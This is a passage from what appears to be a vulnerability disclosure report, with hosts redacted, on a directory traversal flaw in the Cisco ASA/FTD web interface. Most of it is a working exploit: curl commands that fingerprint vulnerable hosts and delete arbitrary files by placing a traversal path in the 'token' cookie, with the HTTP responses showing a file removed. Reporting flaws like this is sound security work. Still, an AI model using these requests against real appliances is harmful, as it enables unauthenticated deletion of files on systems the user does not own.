vulnerability in the interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and obtain read and delete access to sensitive files.\n\nVulnerable host:\n\n- `https://██████/`\n\n## Impact\n\nAn exploit could allow the attacker to view or delete arbitrary files on the system.\n\n## Step-by-step Reproduction Instructions\n\n1) Identifying vulnerable host by send request to `/+CSCOE+/session_password.html`.\n\n```bash\n\u003e curl -skiL \"https://██████/+CSCOE+/session_password.html\"\n```\n\n```\nGET /+CSCOE+/session_password.html HTTP/1.1\nHost: ███████\nUser-Agent: curl/7.47.0\nAccept: */*\n\n```\n\nIf the target is vulnerable, the response header will display `webvpn` header, like:\n\n```\nHTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 0\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Thu, 10 Sep 2020 04:14:27 GMT\nX-Frame-Options: SAMEORIGIN\nwebvpn: \n\n```\n\n2) Perform exploits to delete files by adding `token` in cookie header request.\n\nFor example, I want to delete this (https://████/+CSCOU+/csco_logo.gif) file.\n\n```bash\n\u003e curl -Ik https://██████████/+CSCOU+/csco_logo.gif\n\u003c HTTP/1.1 200 OK\n\u003c Content-Type: image/gif\n\u003c Content-Length: 2678\n\u003c Cache-Control: max-age=6000\n\u003c Connection: Keep-Alive\n\u003c Date: Thu, 10 Sep 2020 04:19:54 GMT\n\u003c X-Frame-Options: SAMEORIGIN\n```\n\nRequest:\n\n```bash\n\u003e curl -skiL \"https://███████/+CSCOE+/session_password.html\" \\\n  -H \"Cookie: token=../+CSCOU+/csco_logo.gif\" \n```\n\n```\nGET /+CSCOE+/session_password.html HTTP/1.1\nHost: ███████\nCookie: token=../+CSCOU+/csco_logo.gif\nUser-Agent: curl/7.47.0\nAccept: */*\n\n```\n\nThe following response is shown:\n\n```\nHTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 0\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Thu, 10 Sep 2020 04:21:02 GMT\nX-Frame-Options: SAMEORIGIN\nwebvpn: \n\n```\n\nFile deleted successfully:\n\n```bash\n\u003e curl -Ik https://██████████/+CSCOU+/csco_logo.gif\n\u003c HTTP/1.1 404 Not Found\n\u003c Cache-Control: no-cache\n\u003c Pragma: no-cache\n\u003c Connection: Close\n\u003c Date: Thu, 10 Sep 2020 04:21:20
